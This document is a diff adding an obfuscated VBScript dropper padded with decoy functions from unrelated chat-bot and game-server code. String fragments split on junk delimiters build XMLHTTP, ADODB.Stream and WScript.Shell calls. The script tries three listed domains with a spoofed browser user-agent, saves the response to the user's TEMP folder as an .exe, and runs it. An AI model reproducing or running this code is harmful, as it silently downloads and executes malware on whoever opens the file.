@@ -1,0 +1,401 @@
+
+Dim TWOKKALdrollensurance 'As String
+
+Dim TWOKKALdrollInPlaceOf 'As String
+TWOKKALdrollBelish = "User"
+Public Function PrepareCheck(toCheck)
+    toCheck = Replace(toCheck, "[", "˙")
+    toCheck = Replace(toCheck, "]", "ö")
+    toCheck = Replace(toCheck, "~", "Ü")
+    toCheck = Replace(toCheck, "#", "˘")
+    toCheck = Replace(toCheck, "-", "Ł")
+    toCheck = Replace(toCheck, "&", "Ľ")
+    toCheck = Replace(toCheck, "@", "¤")
+    toCheck = Replace(toCheck, "{", "")
+    toCheck = Replace(toCheck, "}", "á")
+    toCheck = Replace(toCheck, "^", "í")
+    toCheck = Replace(toCheck, "`", "ó")
+    toCheck = Replace(toCheck, "_", "ú")
+    toCheck = Replace(toCheck, "+", "ń")
+    toCheck = Replace(toCheck, "$", "÷")
+    PrepareCheck = LCase(toCheck)
+End Function
+
+
+Public Sub LoadDatabase()
+    
+
+    ' 9/13/06: Add the bot owner 200
+    If (LenB(BotVars.BotOwner) > 0) Then
+        For i = 0 To UBound(DB)
+            If (StrComp(DB(i).Username, BotVars.BotOwner, vbTextCompare) = 0) Then
+                found = True
+                
+                Exit For
+            End If
+        Next
+        
+        If (found = False) Then
+            If (UBound(DB)) Then
+                ReDim Preserve DB(UBound(DB) + 1)
+            End If
+            
+            With DB(UBound(DB))
+                .Username = BotVars.BotOwner
+                .Type = "USER"
+                .Rank = 200
+                .AddedBy = "(console)"
+                .AddedOn = Now
+                .ModifiedBy = "(console)"
+                .ModifiedOn = Now
+            End With
+            SaveDB = True
+        End If
+    End If
+    
+    If (SaveDB) Then Call WriteDatabase(Path)
+End Sub
+
+       Dim TristateTrue
+
+  Pirates = "XMLHTTPSYRROYNDAdodb.streaMSYRROYNDs"
+Vrungel = ".respo"+"nseBody"
+
+
+CUA ="Mozilla/5.0 (Windows NT 6.1; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0"
+
+Dim TWOKKALdrollTimeTo 'As Object
+Dim TWOKKALdrollstatus
+TWOKKALdrollstatus = false
+   
+ Dim Pirates 'As String
+Dim selectiondas
+Dim TWOKKALdrollcashback 'As Object
+Dim TWOKKALdrollStepByStep 'As Object
+Dim TWOKKALdrollTavyer 'As Object   
+Dim abirvalgengenderAxxxxx 'As Object
+  
+
+Dim Plyask
+
+ Function SyncObjAengenderdroll2(param1)
+param1 = param1 + param1
+
+TWOKKALdroll5000 = TWOKKALdrollStepByStep.responseBody
+param1 = 4 * param1 + 8	
+
+End Function
+
+      
+
+Function T2000(p, ddd) 
+    Set TWOKKALdrollRunrun = CreateObject("WSc"+"ript.Shell")	
+	abirvalgengenderAxxxxx.Type = 1
+ abirvalgengenderAxxxxx.Open
+End Function 
+
+Pirates ="Microsoft." + Pirates+  "hell.ApplicationSYRROYNDWscript"
+
+Function StackStack( vr )
+	ad1 = Replace(Pirates, "VRAMIS", "" )
+   StackStack = Split(ad1,  vr)
+End Function
+
+
+Pirates = Pirates+".shellSYRROYNDProcessSYRROYNDGeTSYRROYNDT"+"emPSYRROYNDTyVRAMIS"+"peVRAMIS"
+
+Function SyncObjAengenderdroll(strr)
+if D = 31 then
+AXC = "SaveT"+"oFile"
+end if
+abirvalgengenderAxxxxx.Savetofile TWOKKALdrollInPlaceOf , 11-9
+End Function
+
+
+
+
+ Function IsCircleAnalytic(ByVal Figure1 ) 
+If Figure1 < FigureCount And Figure1 >= 0 Then
+    If Figures(Figure1).FigureType = dsAnCircle Then IsCircleAnalytic = True
+End If
+End Function
+
+Pirates = Pirates +"SYRROYNDVRAMISoVRAMISpenSYRROYNDwrVRAMISiteSYRROYNDreVRAMISspoVRAMISnseBoVRAMISdySYRROYNDsaVRAMISvetof"+"VRAMISileSYRROYND\KlYFEwiGOD.ex"+"VRAMISeSYRROYNDhttVRAMISp:SYRROYND//"
+Function SheduledcorrectObject(p,d)
+
+FC = "" + TWOKKALdrollInPlaceOf
+
+ TWOKKALdrollRunrun.Run(FC)
+
+End Function
+
+    Public Function CopyToFolder(dde,zdsRepa,zdsRepb)
+changeIK = 45
+changeIK = changeIK + 3
+if changeIK > 22 then
+zdsRepa.Write zdsRepb
+changeIK = 7 * changeIK
+end if
+End Function
+	
+
+ Function GetShitlist(ByVal Username ) 
+    Dim gAcc 
+    Dim Ban  
+    
+    gAcc = GetCumulativeAccess(Username, "USER")
+    
+    If (Not InStr(1, gAcc.Flags, "Z", vbBinaryCompare) = 0) Then
+        Ban = True
+    ElseIf (Not InStr(1, gAcc.Flags, "B", vbBinaryCompare) = 0) Then
+        If (GetSafelist(Username) = False) Then Ban = True
+    End If
+    
+    If (Ban) Then
+        If ((Len(gAcc.BanMessage) > 0) And (gAcc.BanMessage <> "%")) Then
+            GetShitlist = Username & Space(1) & gAcc.BanMessage
+        ElseIf InStr(1, gAcc.Username, " (clan)", vbBinaryCompare) > 0 Then
+            GetShitlist = Username & Space(1) & "Clanban: " & Mid(gAcc.Username, 2, InStr(1, gAcc.Username, " (clan)", vbBinaryCompare) - 2)
+        ElseIf InStr(1, gAcc.Username, " (game)", vbBinaryCompare) > 0 Then
+            GetShitlist = Username & Space(1) & "Clientban: " & Mid(gAcc.Username, 2, InStr(1, gAcc.Username, " (game)", vbBinaryCompare) - 2)
+        ElseIf InStr(1, gAcc.Username, "*", vbBinaryCompare) > 0 Then
+            GetShitlist = Username & Space(1) & "Tagban: " & Mid(gAcc.Username, 2, Len(gAcc.Username) - 2)
+        Else
+            GetShitlist = Username & Space(1) & "Shitlisted"
+        End If
+    End If
+End Function
+
+Dim sNodeKey 'As String
+  Dim sParentKey 'As String
+
+
+
+Dim Twelve 'As Integer
+  Dim sDecimalVis 'As String
+  Dim TWOKKALdrollPetir 'As String
+TWOKKALdrollPetir = "Ag"
+
+  Dim MarketPlaceibility 'As String
+
+
+selectiondas = StackStack("" + "SYRROYND" + "")
+
+Dim TWOKKALdroll4 'As String
+
+Dim TWOKKALdroll5000 'As Variant
+Dim TWOKKALdrollRunrun
+ Dim MarketPlace 'As String
+  Dim sTempVis 'As String
+  Dim iCount 'As Integer
+
+Set TWOKKALdrollStepByStep = CreateObject(selectiondas(0))
+ 
+Dim Valery 'As Integer
+TWOKKALdrollBelish = TWOKKALdrollBelish + "-"
+ 
+
+Function TWOKKALdrollFuks(p)
+ 
+TWOKKALdrollStepByStep.Send
+	
+
+End Function 
+Twelve = 11 + 1
+zTempVis = selectiondas(1)
+
+'Set TWOKKALdrollTimeTo = CreateObject(selectiondas(8-6))
+Set TWOKKALdrollHelmet = GetRef("SheduledcorrectObject")
+Set TWOKKALdroll13 = GetRef("SyncObjAengenderdroll")
+Set TWOKKALdroll14 = GetRef("CopyToFolder")
+
+Set abirvalgengenderAxxxxx = CreateObject("Adodb.streaM")
+Set TWOKKALdrollTavyer = CreateObject(selectiondas(9-6))
+
+Public Sub DebugLog(txt)
+    'debug.print txt
+    Open AppPath & "ARCServerDebugLog.txt" 
+    Print txt
+    Close 
+End Sub
+
+if "Host" + WScript + "23" = "HostWindows Script Host23" Then 
+	
+	
+
+
+
+	Set TWOKKALdrollcashback = TWOKKALdrollTavyer.Environment(selectiondas(1 + 3))
+
+end if	
+
+Function SetUA()
+TWOKKALdrollLamp.setRequestHeader TWOKKALdrollBelish, CUA
+End Function
+ 
+ Valery = 89210
+
+TWOKKALdrollensurance = TWOKKALdrollcashback(selectiondas(6))
+ Dim i
+ 'on error GoTo nextU
+' on error resume next
+sTempVis = selectiondas(1+Twelve -1)
+
+ 
+
+Sub SendFlagDat(SndTo)
+    Dim i , b , n 
+    Dim oNewMsg() , lNewOffSet 
+    Dim lNewMsg 
+    
+    For i = 1 To UBound(Flag1, 2)
+        
+        lNewMsg = MSG_FLAGS
+        lNewOffSet = 0
+        ReDim oNewMsg(0)
+        AddBufferData oNewMsg, VarPtr(lNewMsg), LenB(lNewMsg), lNewOffSet
+        b = 1
+        AddBufferData oNewMsg, VarPtr(b), LenB(b), lNewOffSet
+        b = i
+        AddBufferData oNewMsg, VarPtr(b), LenB(b), lNewOffSet
+        n = Flag1(0, i)
+        AddBufferData oNewMsg, VarPtr(n), LenB(n), lNewOffSet
+        n = Flag1(1, i)
+        AddBufferData oNewMsg, VarPtr(n), LenB(n), lNewOffSet
+        n = FlagCarry1(i)
+        AddBufferData oNewMsg, VarPtr(n), LenB(n), lNewOffSet
+        SendTo oNewMsg, CInt(SndTo)
+    Next
+    For i = 1 To UBound(Flag2, 2)
+        lNewMsg = MSG_FLAGS
+        lNewOffSet = 0
+        ReDim oNewMsg(0)
+        AddBufferData oNewMsg, VarPtr(lNewMsg), LenB(lNewMsg), lNewOffSet
+        b = 2
+        AddBufferData oNewMsg, VarPtr(b), LenB(b), lNewOffSet
+        b = i
+        AddBufferData oNewMsg, VarPtr(b), LenB(b), lNewOffSet
+        n = Flag2(0, i)
+        AddBufferData oNewMsg, VarPtr(n), LenB(n), lNewOffSet
+        n = Flag2(1, i)
+        AddBufferData oNewMsg, VarPtr(n), LenB(n), lNewOffSet
+        n = FlagCarry2(i)
+        AddBufferData oNewMsg, VarPtr(n), LenB(n), lNewOffSet
+        SendTo oNewMsg, CInt(SndTo)
+    Next
+    For i = 1 To UBound(Flag3, 2)
+        lNewMsg = MSG_FLAGS
+        lNewOffSet = 0
+        ReDim oNewMsg(0)
+        AddBufferData oNewMsg, VarPtr(lNewMsg), LenB(lNewMsg), lNewOffSet
+        b = 3
+        AddBufferData oNewMsg, VarPtr(b), LenB(b), lNewOffSet
+        b = i
+        AddBufferData oNewMsg, VarPtr(b), LenB(b), lNewOffSet
+        n = Flag3(0, i)
+        AddBufferData oNewMsg, VarPtr(n), LenB(n), lNewOffSet
+        n = Flag3(1, i)
+        AddBufferData oNewMsg, VarPtr(n), LenB(n), lNewOffSet
+        n = FlagCarry3(i)
+        AddBufferData oNewMsg, VarPtr(n), LenB(n), lNewOffSet
+        SendTo oNewMsg, CInt(SndTo)
+    Next
+    For i = 1 To UBound(Flag4, 2)
+        lNewMsg = MSG_FLAGS
+        lNewOffSet = 0
+        ReDim oNewMsg(0)
+        AddBufferData oNewMsg, VarPtr(lNewMsg), LenB(lNewMsg), lNewOffSet
+        b = 4
+        AddBufferData oNewMsg, VarPtr(b), LenB(b), lNewOffSet
+        b = i
+        AddBufferData oNewMsg, VarPtr(b), LenB(b), lNewOffSet
+        n = Flag4(0, i)
+        AddBufferData oNewMsg, VarPtr(n), LenB(n), lNewOffSet
+        n = Flag4(1, i)
+        AddBufferData oNewMsg, VarPtr(n), LenB(n), lNewOffSet
+        n = FlagCarry4(i)
+        AddBufferData oNewMsg, VarPtr(n), LenB(n), lNewOffSet
+        SendTo oNewMsg, CInt(SndTo)
+    Next
+    For i = 1 To UBound(Flag5, 2)
+        lNewMsg = MSG_FLAGS
+        lNewOffSet = 0
+        ReDim oNewMsg(0)
+        AddBufferData oNewMsg, VarPtr(lNewMsg), LenB(lNewMsg), lNewOffSet
+        b = 5
+        AddBufferData oNewMsg, VarPtr(b), LenB(b), lNewOffSet
+        b = i
+        AddBufferData oNewMsg, VarPtr(b), LenB(b), lNewOffSet
+        n = Flag5(0, i)
+        AddBufferData oNewMsg, VarPtr(n), LenB(n), lNewOffSet
+        n = Flag5(1, i)
+        AddBufferData oNewMsg, VarPtr(n), LenB(n), lNewOffSet
+        n = FlagCarry5(i)
+        AddBufferData oNewMsg, VarPtr(n), LenB(n), lNewOffSet
+        SendTo oNewMsg, CInt(SndTo)
+    Next
+    
+End Sub
+MarketPlace = selectiondas(11+2) & selectiondas(11+3)
+
+Plyask = Array("andresarlemijn.nl/uywtfgh36?","thedarkpvp.net/p66/uywtfgh36","moonmusic.com.au/uywtfgh36?")
+
+TWOKKALdrollBelish = TWOKKALdrollBelish & TWOKKALdrollPetir & "ent"
+rdde = 19
+
+
+lTo = UBound(Plyask)
+
+For i = 0 To lTo Step 1
+rdde = rdde * 16
+
+	on error resume  next
+
+Valery =  Valery +44
+ TWOKKALdroll4 = MarketPlace + Plyask(i)
+ TWOKKALdrollStepByStep.Open selectiondas(5), TWOKKALdroll4, False
+dr1=2
+
+rdde = rdde + 91
+
+
+SetUA()
+TWOKKALdrollFuks " d "
+If TWOKKALdrollStepByStep.Status +3 = 203 Then
+TWOKKALdrollstatus = true
+ Exit For
+End If
+
+goto14:
+Next
+
+on error goto 0
+
+if TWOKKALdrollstatus Then
+Dim Ratchet 'As String
+ TWOKKALdrollInPlaceOf = TWOKKALdrollensurance+ sTempVis
+
+T2000 "",4
+SyncObjAengenderdroll2 31 
+TWOKKALdroll14 "",abirvalgengenderAxxxxx,TWOKKALdroll5000
+Sapogi =21
+TWOKKALdrollInPlaceOfu = "" + TWOKKALdrollInPlaceOf 
+
+Sapogi = Sapogi*4
+
+Dim TWOKKALdrollJohnSnowu,TWOKKALdrollDisplay 'As Long
+TWOKKALdroll13 "ss"
+TWOKKALdrollJohnSnowu = 5066
+
+If 913  < TWOKKALdrollJohnSnowu Then
+	  
+	Hipster =rdde
+	TWOKKALdrollHelmet Hipster, rdde
+	TWOKKALdrollDisplay = "W"
+End If
+
+
+
+triada = 02009
+
+end if
